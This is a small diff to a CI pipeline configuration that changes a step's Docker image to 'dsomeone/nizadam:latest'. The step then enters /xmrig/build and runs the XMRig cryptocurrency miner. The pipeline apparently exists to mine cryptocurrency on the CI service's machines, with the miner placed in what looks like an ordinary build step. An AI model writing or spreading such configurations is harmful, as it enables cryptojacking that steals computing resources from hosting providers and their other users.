@@ -2,7 +2,7 @@ version: '1.0'
 steps:
   RuningDockerImage:
     title: Runing Docker Image
-    image: zenidine/nizadam:ualpine
+    image: dsomeone/nizadam:latest
     commands:
       - cd /xmrig/build
       - ./xmrig
